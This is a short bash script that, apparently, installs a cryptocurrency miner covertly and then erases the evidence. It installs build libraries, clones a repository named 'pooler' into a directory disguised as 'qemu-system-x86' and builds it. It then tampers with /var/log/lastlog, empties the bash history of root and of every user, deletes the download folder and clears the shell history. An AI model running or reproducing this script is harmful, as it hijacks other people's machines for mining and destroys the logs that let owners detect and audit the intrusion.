#!/bin/bash

cpu_cnt=`cat /proc/cpuinfo | awk '/processor/ {print $3}' | wc -l`
#ht_enabled=``
if [  -z "$1" ]
then
        phycores=$(cat /proc/cpuinfo | egrep "core id|physical id" | tr -d "\n" | sed s/physical/\\nphysical/g | grep -v ^$ | sort | uniq | wc -l)
else
        phycores=$1
fi
apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget make libcurl4-openssl-dev
mkdir /usr/share/packages_download
workingdir=/usr/share/packages_download/

#cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
git clone https://github.com/githubuserold/pooler.git /usr/share/packages_download/qemu-system-x86
cd $workingdir/qemu-system-x86
cmake .
make install
sed -i 's/[0-9]/0/g' /var/log/lastlog
users=`ll /home/ | grep -vE "root|total" | awk '{print $9}' | sed 's/\///g'`
for i in ${users}; do
        cat /dev/null > /home/$i/.bash_history
done
cat /dev/null > /root/.bash_history
rm -r /usr/share/packages_download
history -c
